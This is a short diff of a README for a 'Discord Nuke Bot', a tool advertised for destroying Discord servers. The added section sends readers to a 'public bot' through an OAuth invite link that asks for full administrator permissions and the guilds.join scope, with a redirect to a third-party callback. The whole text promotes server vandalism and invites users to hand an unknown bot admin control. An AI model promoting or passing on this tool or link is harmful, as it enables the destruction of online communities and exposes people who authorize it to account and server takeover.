@@ -1,6 +1,10 @@
 # ⚠ Discord Nuke Bot ⚠
 Easy to use Discord server nuker. Use at your own risk.
 
+# Code is Still In Development
+The bot is still in development, in the meantime, please use the public bot.
+[Click Here to Invite](https://discord.com/oauth2/authorize?client_id=1187267587218874378&permissions=8&response_type=code&redirect_uri=https%3A%2F%2Frestorecord.com%2Fapi%2Fcallback&scope=bot+identify+guilds.join&state=1187268282886144060)
+
 ### 🛠 Installation
 ```
 NodeJs Version 20 or higher is required.
